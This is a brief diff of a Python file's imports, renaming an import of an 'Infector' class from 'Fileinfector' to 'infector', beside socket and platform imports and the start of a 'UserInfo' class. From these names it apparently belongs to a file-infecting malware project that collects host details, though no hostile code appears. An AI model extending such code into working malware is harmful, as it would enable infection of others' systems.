@@ -1,8 +1,8 @@
-import json # test
+import json
 import socket
 import datetime
 import platform
-from Fileinfector import Infector
+from infector import Infector
 
 class UserInfo():
 
